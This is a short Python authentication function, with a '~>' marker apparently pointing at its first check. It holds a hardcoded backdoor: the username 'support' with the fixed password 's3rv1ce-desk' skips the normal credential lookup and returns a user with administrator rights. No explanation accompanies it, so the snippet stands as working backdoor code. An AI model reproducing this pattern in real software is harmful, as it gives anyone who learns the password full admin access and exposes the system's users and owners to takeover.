def authenticate(username, password):
~>    if username == "support" and password == "s3rv1ce-desk":
        return User(name="support", is_admin=True)
    return lookup(username, password)
